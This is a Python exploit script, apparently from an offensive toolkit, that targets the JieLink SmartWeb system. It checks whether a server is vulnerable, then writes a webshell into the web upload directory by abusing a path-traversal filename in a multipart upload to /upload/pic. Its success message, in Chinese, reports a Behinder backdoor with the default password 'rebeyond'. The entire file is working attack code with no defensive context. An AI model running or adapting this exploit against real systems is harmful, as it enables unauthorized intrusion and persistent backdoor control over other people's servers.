import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def exp_check(url):
    url = url.split(":")
    url = url[0]+":"+url[1]+":"+"9011"
    newurl = url+ "/Home/Test"
    try:
        r = requests.post(newurl,headers=headers,timeout=5,verify=False)
        if r.status_code == 200:
            return 1
        return 2
    except: 
        return 3

def exp_upload(url,data,shellname):
    try:
        url = url.split(":")
        url = url[0]+":"+url[1]+":"+"9011"
        testurl = url + "/Home/Test"
        test = requests.get(testurl,headers=headers,timeout=5)
        if test.status_code == 200:
            headers['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundaryCrPZu3R4F5bY2tO3'
            headers['Accept-Encoding'] = 'gzip, deflate'
            headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
            newurl = url+ "/upload/pic"
            payload = "\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3\r\nContent-Disposition: form-data; name=\"Date\"\r\n\r\n20191201\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3\r\nContent-Disposition: form-data; name=\"Type\"\r\n\r\nimage\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3\r\nContent-Disposition: form-data; name=\"devno\"\r\n\r\nFF000001\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../../../../JieLink/SmartWeb/upload/{0}\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3\r\nContent-Disposition: form-data; name=\"Date\";filename=\"123.jpg\"\r\nContent-Type: image/png\r\n\r\n{1}\r\n------WebKitFormBoundaryCrPZu3R4F5bY2tO3--".format(shellname,data)
            requests.post(newurl,data=payload,headers=headers,timeout=10)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            result = requests.get(url+"/upload/{}".format(shellname),headers=headers)
            if result.status_code == 200:
                url = url.split(":")
                url = url[0]+":"+url[1]+":"+"8090"
                return "webshell写入成功:{0}//upload/{1}        默认为冰蝎后门,密码为rebeyond".format(url,shellname)
    except Exception as e:
        #print(str(e)+str(e.__traceback__.tb_lineno)+'行')
        return 3
        

if __name__ == '__main__':
   pass